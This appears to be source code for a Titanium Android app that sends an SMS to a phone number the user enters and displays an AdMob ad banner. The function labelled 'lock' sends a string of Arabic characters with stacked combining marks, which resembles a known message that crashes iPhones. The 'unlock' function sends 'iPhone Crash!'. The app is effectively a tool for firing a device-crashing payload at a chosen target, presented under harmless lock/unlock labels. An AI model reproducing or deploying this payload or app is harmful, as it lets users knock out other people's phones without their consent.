var smsMod = require('ti.android.sms');
Ti.API.info("module is => " + smsMod);

smsMod.addEventListener('complete', function(e) {
	Ti.API.info('Result: ' + (e.success ? 'success' : 'failure') + ' msg: ' + e.resultMessage);
	var result = 'unexpected result...';
	switch (e.result) {
		case smsMod.SENT:
			result = 'SENT';
			break;
		case smsMod.DELIVERED:
			result = 'DELIVERED';
			break;
		case smsMod.FAILED:
			result = 'FAILED';
			break;
		case smsMod.CANCELLED:
			result = 'CANCELLED';
			break;
	}
});

var alertDialog = Titanium.UI.createAlertDialog({
	buttonNames : [L('buttonYes'), L('buttonNo')],
	cancel : 1
});

alertDialog.addEventListener('click', function(e) {
	if (e.cancel === e.index || e.cancel === true) {
		return;
	}
	if (e.index === 0) {
		var recipient = $.txtPhoneNumber.value;
		var text = alertDialog.smsText;
		var successMessage = alertDialog.smsSuccess;
		
		smsMod.sendSMS(recipient, text);

		$.txtPhoneNumber.blur();
		$.vwForm.visible = false;

		setTimeout(function() {
			$.vwForm.visible = true;
			alert(successMessage);
		}, 5000);
	}
});

function doLock(e) {
	alertDialog.title = L('alertTitle');
	alertDialog.message = String.format(L('lockAlert'), $.txtPhoneNumber.value);
	alertDialog.smsText = 'وُوُحخ ̷̴̐خ ̷̴̐خ ̷̴̐خ امارتيخ ̷̴̐خ‎';
	alertDialog.smsSuccess = String.format(L('lockSuccess'), $.txtPhoneNumber.value);
	alertDialog.show();
}

function doUnlock(e) {
	alertDialog.title = L('alertTitle');
	alertDialog.message = String.format(L('unlockAlert'), $.txtPhoneNumber.value);
	alertDialog.smsText = "iPhone Crash!";
	alertDialog.smsSuccess = String.format(L('unlockSuccess'), $.txtPhoneNumber.value);
	alertDialog.show();
}

// require AdMob
var Admob = require('ti.admob');

// then create an adMob view
var adMobView = Admob.createView({
	publisherId : "ca-app-pub-8604525528725010/5869692922",
	testing : false, // default is false
	//top: 10, //optional
	//left: 0, // optional
	//right: 0, // optional
	bottom : 0, // optional
	adBackgroundColor : "FF8855", // optional
	backgroundColorTop : "738000", //optional - Gradient background color at top
	borderColor : "#000000", // optional - Border color
	textColor : "#000000", // optional - Text color
	urlColor : "#00FF00", // optional - URL color
	linkColor : "#0000FF" //optional -  Link text color
	//primaryTextColor: "blue", // deprecated -- now maps to textColor
	//secondaryTextColor: "green" // deprecated -- now maps to linkColor

});

$.index.add(adMobView);

$.index.open();
